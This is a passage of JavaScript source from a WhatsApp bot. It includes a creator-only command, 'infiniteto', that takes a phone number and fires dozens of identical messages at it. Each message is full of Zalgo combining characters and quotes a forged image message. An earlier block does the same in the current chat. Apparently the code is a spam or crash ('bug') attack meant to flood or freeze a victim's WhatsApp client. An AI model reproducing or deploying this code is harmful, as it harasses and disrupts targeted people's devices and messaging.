            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            break
            case 'infiniteto':               
          if (!isCreator) return
          if (!text) throw `Nomernya mana?`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
